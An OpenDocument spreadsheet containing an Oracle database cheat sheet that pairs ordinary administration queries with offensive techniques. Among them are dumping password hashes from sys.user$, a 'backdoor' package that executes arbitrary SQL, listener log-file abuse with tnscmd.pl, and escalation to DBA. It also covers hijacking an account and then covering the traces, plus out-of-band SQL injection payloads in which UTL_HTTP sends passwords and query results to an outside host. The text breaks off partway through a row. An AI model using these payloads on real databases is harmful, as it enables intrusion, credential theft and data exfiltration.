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47.7pt"/>
    </style:style>
    <style:style style:name="co2" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="307.19pt"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="64.01pt"/>
    </style:style>
    <style:style style:name="co4" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="448.5pt"/>
    </style:style>
    <style:style style:name="co5" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="288.71pt"/>
    </style:style>
    <style:style style:name="co6" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="446.94pt"/>
    </style:style>
    <style:style style:name="co7" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="290.24pt"/>
    </style:style>
    <style:style style:name="co8" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="322.64pt"/>
    </style:style>
    <style:style style:name="co9" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="312.6pt"/>
    </style:style>
    <style:style style:name="ro1" style:family="table-row">
      <style:table-row-properties style:row-height="12.81pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro2" style:family="table-row">
      <style:table-row-properties style:row-height="26.79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46.49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120.76pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro9" style:family="table-row">
      <style:table-row-properties style:row-height="137.25pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro10" style:family="table-row">
      <style:table-row-properties style:row-height="19.7pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro11" style:family="table-row">
      <style:table-row-properties style:row-height="142.5pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro12" style:family="table-row">
      <style:table-row-properties style:row-height="91.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro13" style:family="table-row">
      <style:table-row-properties style:row-height="114.01pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro14" style:family="table-row">
      <style:table-row-properties style:row-height="102.76pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro15" style:family="table-row">
      <style:table-row-properties style:row-height="327.74pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro16" style:family="table-row">
      <style:table-row-properties style:row-height="80.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro17" style:family="table-row">
      <style:table-row-properties style:row-height="125.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro18" style:family="table-row">
      <style:table-row-properties style:row-height="69pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro19" style:family="table-row">
      <style:table-row-properties style:row-height="136.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro20" style:family="table-row">
      <style:table-row-properties style:row-height="192.76pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro21" style:family="table-row">
      <style:table-row-properties style:row-height="215.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro22" style:family="table-row">
      <style:table-row-properties style:row-height="147.74pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro23" style:family="table-row">
      <style:table-row-properties style:row-height="13.41pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro24" style:family="table-row">
      <style:table-row-properties style:row-height="260.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro25" style:family="table-row">
      <style:table-row-properties style:row-height="35.04pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro26" style:family="table-row">
      <style:table-row-properties style:row-height="46.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro27" style:family="table-row">
      <style:table-row-properties style:row-height="326.1pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro28" style:family="table-row">
      <style:table-row-properties style:row-height="79.85pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro29" style:family="table-row">
      <style:table-row-properties style:row-height="181.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro30" style:family="table-row">
      <style:table-row-properties style:row-height="68.66pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro31" style:family="table-row">
      <style:table-row-properties style:row-height="124.61pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro32" style:family="table-row">
      <style:table-row-properties style:row-height="113.41pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro33" style:family="table-row">
      <style:table-row-properties style:row-height="214.16pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro34" style:family="table-row">
      <style:table-row-properties style:row-height="170.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro35" style:family="table-row">
      <style:table-row-properties style:row-height="204.01pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro36" style:family="table-row">
      <style:table-row-properties style:row-height="37.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro37" style:family="table-row">
      <style:table-row-properties style:row-height="28.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro38" style:family="table-row">
      <style:table-row-properties style:row-height="19.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro39" style:family="table-row">
      <style:table-row-properties style:row-height="64.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro40" style:family="table-row">
      <style:table-row-properties style:row-height="82.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro41" style:family="table-row">
      <style:table-row-properties style:row-height="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style>
    <style:style style:name="ce11" style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:wrap-option="no-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no-wrap"/>
    </style:style>
    <style:style style:name="ce1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font-name="Liberation Sans"/>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19" style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:wrap-option="no-wrap"/>
      <style:text-properties style:font-name="Liberation Serif"/>
    </style:style>
    <style:style style:name="T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DejaVu Sans" style:font-name="Liberation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Noto Sans Devanagari"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Oracle" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co2" table:default-cell-style-name="ce12"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>scheduled jobs</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT job from USER_JOBS;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>what does a job do</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT JOB, WHAT FROM USER_JOBS WHERE JOB = job_name;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>to log all sys and system commands; has to be set in the init.ora file</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>AUDIT_SYS_OPERATIONS=TRUE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Audit option has to be set in init.ora file</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>AUDIT_TRAIL=DB (or FS to save on file system)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>check if audit_trail is enabled</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, value from v$parameter where name like ‘%audit_trail%’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>list the audited table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT o.name from sys.obj$ o, sys.tab$ t where t.audit$ like ‘%A%’ and o.obj#=t .obj#;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>list the audited table and the audited action (select/update/etc)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT  object_name, object_type, del, ins, sel, upd FROM dba_obj_audit_opts where del like ‘%A%’ or ins like ‘%A%’ or sel like ‘%A%’ or upd like ‘%A%’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>check if FGA is enabled</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from DBA_AUDIT_POLICIES;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>check which objects are audited whith FGA</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT object_name, object_type, del, ins, sel, upd FROM dba_obj_audit_opts;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>table where audit log are stored</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>sys.FGA_LOG$</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>use this view to read FGA data</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>DBA_FGA_AUDIT_TRAIL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>list all the stored procedure and their owner</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT OWNER, object_name, object_type FROM dba_obj_audit_opts where object_type=’PROCEDURE’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To list all the active trigger</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT owner,TRIGGER_NAME,TRIGGER_TYPE,status from dba_triggers;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To the UTL_FILE_DIR if present</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, value from v$parameter where name = ‘utl_file_dir’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>change the value of utl_file_dir (db restart needed)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>alter system set utl_file_dir=’*’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To get users and passwords</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, password FROM sys.user$ where type#=1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>if pfile is defined it’s possible to change the utl_file_dir in runtime without restarting the database</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>alter system set utl_file_dir=’*’ scope =spfile;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To copy a table into another</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>create table xxx.yyy as SELECT * from old.table;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Copy table from foreign host to here</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>COPY FROM user@tnsname CREATE tablename USING SELECT * FROM tablename;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>remove all tabulations in  query output</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>set head off set echo off set pagesize 0 set space 1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Set display rows</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SET PAGESIZE 66;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To give all java permission (read,write,execute) to a user</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>exec dbms_java.grant_permission(‘oracle_user’, ‘SYS:java.io.FilePermission’, ‘&lt;&lt;ALL FILES&gt;&gt;’, ‘execute’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To extract a single choosed record from a table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TNAME from (SELECT TNAME,ROWNUM as rn from tab) where rn=’2′;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To list top n rows of a table in order</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM (SELECT * FROM t ORDER BY c) WHERE ROWNUM &lt;= n;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To view the oracle version</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT banner from v$version; #or SELECT banner || ‘-‘ || (SELECT banner from v$version where banner like ‘Oracle%’) from v$version where banner like ‘TNS%’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show the source code of a package</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT text FROM user_source WHERE name = ‘SR_PKG’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To disable the uppersand (useful when creating a file on the disk)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>set define off</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To enable and define an escape char</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>set escape \</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show the IP address of the db server</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT SYS_CONTEXT(‘USERENV’, ‘IP_ADDRESS’, 15) ipaddr from dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show the HOSTNAME of the db server</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT SYS_CONTEXT(‘USERENV’, ‘HOST’, 15) ipaddr from dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show user grants</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from user_sys_privs;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>oracle simple backdoor (hey gippo, really thank you!)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>CREATE OR REPLACE PACKAGE RAIST_PKG AS PROCEDURE exec_this_code(commandline IN VARCHAR2); END RAIST_PKG; / CREATE OR REPLACE PACKAGE BODY RAIST_PKG AS PROCEDURE exec_this_code(commandline IN VARCHAR2) IS BEGIN EXECUTE IMMEDIATE commandline; END; END RAIST_PKG; /</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To start a session as sysdba</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>sqlplus sys@sid as sysdba;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To start a sysdba session under Windows</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>sqlplus “/as sysdba”;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To start a session as sysdba before oracle 9i</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>$ svrmgrl svrmgrl&gt; connect internal</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To list all tables in current schema</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_name FROM user_tables;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To turn pause on</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SET PAUSE ON;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show current database</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM global_name;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>to show who I am</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SHOW USER;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>to start SQLPLUS without login</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SQLPLUS /NOLOG</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To change a user’s password</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>ALTER USER user IDENTIFIED BY password;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>to lock/unlock an account</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>ALTER USER user ACCOUNT LOCK/UNLOCK;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To delete a user and all his objects</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>drop user username cascade;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To grant a priv to an user</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>Grant “privilege” to “user”;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To grant privileges on a table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>grant privileges on object to user;  (use public for any) eg. grant SELECT, insert, update, delete on suppliers to smithj;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To revoke privileges on a table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>revoke privileges on object from user; eg. revoke delete on suppliers from anderson;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To grant privileges on a function or a procedure</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>grant execute on object to user; (use public for any) eg. grant execute on Find_Value to smithj;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To discover all the functions with public execute grant</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from dba_tab_privs p, all_arguments a where grantee = ‘PUBLIC’ and privilege = ‘EXECUTE’ and p.table_name = a.package_name and p.owner = a.owner and a.position = 0 and a.in_out = ‘OUT’ order by p.owner, p.table_name, p.grantee</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To revoke privileges on a function or a procedure</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>revoke execute on object from user; eg. revoke execute on Find_Value from anderson;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To write a file abusing the tns listener log file using tnscmd.pl</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>perl ./tnscmd.pl -p1521 -h gollum –rawcmd “(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)(VERSION=1)(VALUE=/tmp/test)))” perl ./tnscmd.pl -h gollum –rawcmd “(CONNECT_DATA=((             + + ))” #respect the carriage return              ^^^^</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To open a http connection somewhere</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT utl.http_request(‘http://www.mioserver.pub’) from dual; #i know this trick in useful in at least two case: #case 1: modifying the glogin.sql file with the trick described above(with a #create user commandJ , you will have a line dropped in the log file of your #web server when a DBA log in. #case 2: it’s useful in sql injection to discover the IP address of the db server or to send data over http. SELECT utl_http.request(‘http://www.example.com’) FROM DUAL SELECT utl_http.request(‘http://www.example.com/?’ || (SELECT pass FROM members) ) FROM DUAL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To escalate privileges from user: OUTLN BACKUP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>exec ctxsys.driload.validate_stmt(‘grant dba to user’); exec dbms_repcat_admin.grant_admin_any_schema(‘user’)’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>to become a user without knowing his password</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p># first step, read his password hash SELECT password from sys.user$ where username=’user’; #second step, change his password Alter user username identified by new_password; #now you can log in with the user Sqlplus user/new_password@sid #When you are done you can set back the old user password update sys.user$ set password=’HASH’ where name=’DBA’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Functions useful for Blind SQL Injetion</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string">
            <text:p>BEGIN DBMS_LOCK.SLEEP(5); END; – Sleep for 5 seconds CHR() – Convert to Char ASCII() – Convert to ASCII SUBSTR() – Substring BITAND() – Bit And operation LOWER() – Convert to LowerCase</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell/>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>5 – MISC and Functions</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Out of Band attack: sniffer app will save results</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Out of Band attack: results saved in HTTP access log</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Out of Band attack: sniff DNS requests to yourhost.com</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
